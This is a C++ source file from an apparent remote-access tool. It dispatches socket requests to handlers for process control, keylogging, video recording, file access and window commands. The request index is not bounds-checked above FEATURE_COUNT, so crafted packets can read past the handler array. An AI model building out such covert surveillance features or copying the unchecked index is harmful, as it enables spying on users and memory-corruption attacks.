#include "RequestHandler.hpp"

#include <iostream>

#include "File.hpp"
#include "Keylogger.hpp"
#include "Process.hpp"
#include "VideoRecording.hpp"
#include "WindowCommand.hpp"

RequestHandler::RequestHandler() {

}

FeatureHandler* RequestHandler::featureHandlers[FEATURE_COUNT] = {
    new Process(),
    new Keylogger(),
    new VideoRecording(),
    new File(),
    new WindowCommand()
};

DWORD RequestHandler::ProcessClient(LPVOID lpParam) {
    auto clientSocket = reinterpret_cast<SOCKET>(lpParam);

    PacketHeader header{};
    int bytesReceived = recv(clientSocket, reinterpret_cast<char *>(&header), sizeof(header), 0);
    if (bytesReceived <= 0)
    {
        std::cerr << "Failed to receive header from client." << std::endl;
        closesocket(clientSocket);
        return 1;
    }
    if (header.request_key == FEATURE_COUNT) {
        Response res(header.request_id, 1);
        res.sendResponse(clientSocket);
        closesocket(clientSocket);
        return 0;
    }
    featureHandlers[header.request_key]->HandleRequest(clientSocket,header);
    closesocket(clientSocket);
    return 0;
}
